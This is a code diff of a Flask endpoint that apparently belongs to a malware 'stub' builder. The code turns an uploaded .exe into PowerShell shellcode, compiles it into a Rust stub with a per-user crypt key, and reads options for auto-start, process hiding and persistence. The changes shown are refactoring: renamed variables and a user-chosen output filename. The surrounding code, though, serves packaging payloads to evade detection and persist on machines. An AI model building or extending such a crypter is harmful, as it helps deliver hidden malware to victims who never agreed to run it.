@@ -280,9 +280,11 @@ def create_stub():
 
         uploaded_file = None
         ps1_file_created = None
-        cpp_exe_created = None
+        stub_exe_created = None
 
         user_plain_password = f"{user_id}_night_crypt_key"
+
+        file_name = request.form.get('fileName', '')
 
         if 'file' in request.files:
             file = request.files['file']
@@ -338,7 +340,12 @@ def create_stub():
                         with open(rust_main_path, 'w', encoding='utf-8') as f:
                             f.write(rust_code)
 
-                        exe_filename = f"exp_stub_{ps1_number}.exe"
+                        if file_name and file_name.strip():
+                            exe_filename = secure_filename(file_name)
+                            if not exe_filename.lower().endswith('.exe'):
+                                exe_filename += '.exe'
+                        else:
+                            exe_filename = f"exp_stub_{ps1_number}.exe"
                         exe_path = os.path.join(user_exe_path, exe_filename)
 
                         compile_cmd = [
@@ -348,7 +355,7 @@ def create_stub():
                         result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True, shell=True)
 
                         if result.returncode == 0:
-                            cpp_exe_created = exe_filename
+                            stub_exe_created = exe_filename
                             print(f"Successfully compiled Rust stub: {exe_filename}")
 
                             # Move the compiled executable to the user's exe folder
@@ -368,7 +375,6 @@ def create_stub():
                         os.remove(temp_file_path)
                     return jsonify({'success': False, 'message': f'Error converting .exe file to PowerShell shellcode: {str(e)}'}), 500
 
-        file_name = request.form.get('fileName', '')
         auto_start = request.form.get('autoStart') == 'true'
         hide_process = request.form.get('hideProcess') == 'true'
         persistence = request.form.get('persistence') == 'true'
@@ -385,7 +391,7 @@ def create_stub():
             'createdAt': datetime.datetime.now().isoformat(),
             'hasUploadedFile': uploaded_file is not None,
             'powershellFile': ps1_file_created,
-            'cppExecutable': cpp_exe_created
+            'stubExecutable': stub_exe_created
         }
 
         config_path = os.path.join(user_stubs_path, f"{file_name}.config.json")
@@ -397,15 +403,15 @@ def create_stub():
         success_message = 'Stub created successfully'
         if ps1_file_created:
             success_message += f' - PowerShell file: {ps1_file_created}'
-        if cpp_exe_created:
-            success_message += f' - C++ executable: {cpp_exe_created}'
+        if stub_exe_created:
+            success_message += f' - Executable: {stub_exe_created}'
 
         return jsonify({
             'success': True,
             'message': success_message,
             'folderPath': f'stubs/{user_id}',
             'config': stub_config,
-            'executableFile': cpp_exe_created
+            'executableFile': stub_exe_created
         })
 
     except Exception as e:
